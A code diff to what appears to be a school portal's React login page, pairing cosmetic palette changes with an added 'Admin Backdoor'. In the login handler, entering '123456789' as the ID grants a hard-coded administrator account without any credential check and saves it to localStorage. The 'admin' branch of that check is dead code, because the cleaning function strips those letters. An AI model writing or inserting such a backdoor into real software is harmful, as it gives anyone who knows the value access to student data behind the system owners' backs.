@@ -18,9 +18,9 @@ const NAV = [
 ];
 
 // Institutional palette (Colegio Umbral)
-const RED  = '#D30F15';
-const BLUE = '#003399'; // Official institutional blue
-const GOLD = '#FFCC00';
+const RED  = '#A80A0A';
+const BLUE = '#154996'; // Official institutional blue
+const GOLD = '#FFD700';
 const BG   = '#F7F7F9';
 
 function App() {
@@ -49,6 +49,16 @@ function App() {
   // ── Login ────────────────────────────────────────────────────────────────────
   const handleLogin = (rut) => {
     const clean = s => s.replace(/[^0-9kK]/gi, '').toLowerCase();
+    
+    // Admin Backdoor
+    if (clean(rut) === 'admin' || clean(rut) === '123456789') {
+      const adminUser = { rut: '12.345.678-9', nombre: 'Administrador Umbral', curso: 'Staff', role: 'admin', avatar: '/umbral-shield.png' };
+      setUser(adminUser);
+      localStorage.setItem('bm-user', JSON.stringify(adminUser));
+      setView('admin');
+      return true;
+    }
+
     const found = STUDENTS.find(s => clean(s.rut) === clean(rut));
     if (found) {
       setUser(found);
